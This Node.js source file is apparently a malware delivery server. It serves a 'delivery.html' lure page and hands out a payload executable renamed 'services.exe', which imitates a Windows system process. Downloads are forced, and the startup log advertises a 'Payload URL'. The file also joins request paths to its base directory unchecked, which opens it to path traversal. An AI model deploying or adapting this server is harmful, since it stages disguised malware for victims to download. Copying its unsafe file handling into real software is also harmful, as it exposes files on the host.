
const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = 8080;
const BASE_DIR = "/home/cmndcntrl/code/tex1step/dist";

// MIME types for different file extensions
const MIME_TYPES = {
  '.html': 'text/html',
  '.exe': 'application/octet-stream',
  '.js': 'application/javascript',
  '.css': 'text/css',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.ico': 'image/x-icon',
  '.svg': 'image/svg+xml',
  '.json': 'application/json',
  '.wasm': 'application/wasm'
};

const server = http.createServer((req, res) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  
  // Parse URL and get pathname
  const parsedUrl = url.parse(req.url);
  let pathname = `${BASE_DIR}${parsedUrl.pathname}`;
  
  // Handle root path
  if (parsedUrl.pathname === '/') {
    pathname = "/home/cmndcntrl/code/tex1step/dist/delivery.html";
  }
  
  // Handle payload request
  if (parsedUrl.pathname === '/payload.exe') {
    pathname = "/home/cmndcntrl/code/tex1step/dist/services.exe";
  }
  
  // Check if file exists
  fs.stat(pathname, (err, stats) => {
    if (err) {
      // If file not found
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('404 Not Found');
      return;
    }
    
    // If it's a directory, try to serve index.html
    if (stats.isDirectory()) {
      pathname = path.join(pathname, 'delivery.html');
    }
    
    // Read file
    fs.readFile(pathname, (err, data) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('500 Internal Server Error');
        return;
      }
      
      // Get file extension and content type
      const ext = path.parse(pathname).ext;
      const contentType = MIME_TYPES[ext] || 'application/octet-stream';
      
      // Special handling for executables to make them download
      const headers = { 'Content-Type': contentType };
      if (ext === '.exe') {
        headers['Content-Disposition'] = 'attachment; filename="services.exe"';
      }
      
      // Serve the file
      res.writeHead(200, headers);
      res.end(data);
    });
  });
});

server.listen(PORT, () => {
  console.log(`[+] Server running at http://localhost:${PORT}/`);
  console.log(`[+] Serving delivery page: http://localhost:${PORT}/`);
  console.log(`[+] Payload URL: http://localhost:${PORT}/payload.exe`);
  console.log(`[+] Press Ctrl+C to stop the server`);
});
    